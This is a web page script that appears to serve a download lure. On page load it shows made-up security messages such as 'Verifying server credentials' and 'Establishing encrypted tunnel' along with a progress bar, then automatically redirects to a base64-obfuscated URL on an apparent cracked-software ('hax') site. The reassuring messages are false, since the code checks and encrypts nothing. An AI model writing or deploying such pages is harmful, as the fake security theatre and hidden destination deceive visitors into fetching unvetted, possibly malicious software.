document.addEventListener('DOMContentLoaded', function() {
  const statusText = document.getElementById('status-text');
  const errorText = document.getElementById('error-text');
  const progressFill = document.querySelector('.progress-fill');
  
  const encodedRedirect = 'aHR0cHM6Ly9mcmVldG9tYWN4LmNvbS9oYXgv';
  const redirectUrl = atob(encodedRedirect);
  
  const statusMessages = [
    'Initializing secure session...',
    'Verifying server credentials...',
    'Establishing encrypted tunnel...',
    'Preparing download link...',
    'Connection established'
  ];
  
  let messageIndex = 0;
  let isComplete = false;
  
  function updateStatus() {
    if (messageIndex < statusMessages.length && !isComplete) {
      statusText.textContent = statusMessages[messageIndex];
      messageIndex++;
      
      const progress = (messageIndex / statusMessages.length) * 100;
      progressFill.style.width = progress + '%';
      
      if (messageIndex < statusMessages.length) {
        setTimeout(updateStatus, 300);
      } else {
        isComplete = true;
        statusText.textContent = 'Download starting...';
        
        setTimeout(() => {
          window.location.href = redirectUrl;
        }, 500);
      }
    }
  }
  
  setTimeout(updateStatus, 200);
  
  const card = document.querySelector('.card');
  
  card.addEventListener('mouseenter', function() {
    if (!isComplete) {
      this.style.transform = 'translateY(-2px)';
      this.style.boxShadow = '0 40px 80px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1)';
    }
  });
  
  card.addEventListener('mouseleave', function() {
    if (!isComplete) {
      this.style.transform = 'translateY(0)';
      this.style.boxShadow = '0 32px 64px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(255, 255, 255, 0.05)';
    }
  });
});

function toggleInfoPopup() {
  const popup = document.getElementById('infoPopup');
  if (popup.style.display === 'block') {
    popup.style.display = 'none';
  } else {
    popup.style.display = 'block';
  }
}

document.addEventListener('click', function(event) {
  const popup = document.getElementById('infoPopup');
  const infoBtn = event.target.closest('button[onclick="toggleInfoPopup()"]');
  
  if (!popup.contains(event.target) && !infoBtn) {
    popup.style.display = 'none';
  }
});
